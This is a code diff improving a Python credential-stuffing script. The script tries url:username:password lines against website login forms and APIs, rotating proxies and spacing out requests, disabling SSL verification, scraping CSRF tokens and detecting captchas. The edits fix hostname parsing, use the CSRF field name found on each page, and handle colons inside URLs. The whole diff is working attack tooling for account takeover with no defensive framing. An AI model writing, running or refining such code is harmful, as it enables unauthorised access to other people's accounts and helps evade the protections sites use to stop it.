@@ -11,6 +11,10 @@ import socket
 import ssl
 import urllib3
 import random
+from urllib.parse import urlparse
+
+# Make sure to install required libraries if you haven't already:
+# pip install requests beautifulsoup4 urllib3
 
 # Allow legacy SSL (optional; lowers security)
 ssl._create_default_https_context = ssl._create_unverified_context
@@ -53,7 +57,10 @@ def get_next_proxy():
 
 def domain_resolves(url):
     try:
-        domain = url.split("/")[2] if url.startswith("http") else url.split("/")[0]
+        parsed = urlparse(url if url.startswith("http") else f"https://{url}")
+        domain = parsed.hostname
+        if not domain:
+            return False
         socket.gethostbyname(domain)
         return True
     except Exception:
@@ -79,14 +86,15 @@ def get_csrf_token(session, url):
     try:
         resp = session.get(url, headers=HEADERS, timeout=30, verify=False)
         if resp.status_code != 200:
-            return None
+            return None, None
         soup = BeautifulSoup(resp.text, "html.parser")
         token_field = detect_possible_csrf_field(resp.text) or CSRF_TOKEN_FIELD
         token_input = soup.find("input", {"name": token_field})
-        return token_input.get("value") if token_input else None
+        token_value = token_input.get("value") if token_input else None
+        return token_field, token_value
     except Exception as e:
         logging.warning(f"Error fetching CSRF token from {url}: {e}")
-        return None
+        return None, None
 
 def detect_captcha(response_text):
     indicators = ["captcha", "recaptcha", "g-recaptcha", "hcaptcha", "please verify", "are you human"]
@@ -95,7 +103,8 @@ def detect_captcha(response_text):
 
 def test_credential(line):
     time.sleep(1.5)
-    parts = [p.strip().strip("'").strip('"') for p in line.strip().split(":") if p.strip()]
+    raw_parts = line.strip().rsplit(":", 2)
+    parts = [p.strip().strip("'").strip('"') for p in raw_parts if p.strip()]
     if len(parts) != 3:
         return f"[SKIP] Invalid format: {line}"
 
@@ -119,7 +128,7 @@ def test_credential(line):
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
     is_json_api = url.endswith("/api/login") or "/api/" in url
-    csrf_token = get_csrf_token(session, url) if not is_json_api else None
+    csrf_field, csrf_token = get_csrf_token(session, url) if not is_json_api else (None, None)
 
     try:
         if is_json_api:
@@ -133,7 +142,7 @@ def test_credential(line):
                 DEFAULT_PASSWORD_FIELD: password
             }
             if csrf_token:
-                login_data[CSRF_TOKEN_FIELD] = csrf_token
+                login_data[csrf_field] = csrf_token
             response = session.post(url, data=login_data, timeout=60, proxies=proxies, verify=False)
 
         if detect_captcha(response.text):
